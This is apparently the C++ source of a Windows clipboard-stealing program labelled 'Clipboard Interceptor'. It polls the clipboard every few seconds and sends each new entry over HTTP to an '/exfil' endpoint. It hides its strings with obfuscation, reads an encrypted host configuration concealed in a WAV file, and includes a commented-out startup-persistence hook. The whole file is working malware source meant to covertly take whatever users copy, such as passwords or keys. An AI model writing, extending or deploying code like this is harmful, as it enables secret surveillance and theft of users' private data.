#include <iostream>
#include <windows.h>
#include <string>
#include <thread>

#include <clipboard.h>
#include <tools.h>
#include <httpexfil.h>
#include <wavcrypt.h>
#include <obfstr.h>

void HandleNewData(std::string& data)
{    
    std::cout << OBFSTR("[*] New Clipboard Content:\n\n") << data << "\n\n";
    std::cout << OBFSTR("Sending data to receiver...\n");

    try
    {
        ExfiltrateClipboardHTTP(data, "127.0.0.1", "/exfil", 80);
    }
    catch(const std::exception& ex)
    {
        std::wcout << OBFSTR("Error when sending data to receiver: ") << ex.what() << "\n";
    }
    catch(...)
    {
        std::wcout << OBFSTR("Unknown exception occured when sending data to receiver.\n");
    }
}

int main() {
    // AddToStartup();

    std::cout << OBFSTR("[*] Clipboard Interceptor Started\n");
    std::string lastClipboard = "";

    auto [host, port, path] = ExtractAndDecryptConfig(OBFSTR("ouch.wav"));

    while(true)
    {
        std::string currentClipboard = GetClipboardText();

        if(!currentClipboard.empty() && currentClipboard != lastClipboard) 
        {
            HandleNewData(currentClipboard);  
            lastClipboard = currentClipboard;
        }

        std::this_thread::sleep_for(std::chrono::seconds(3));
    }

    return 0;
}
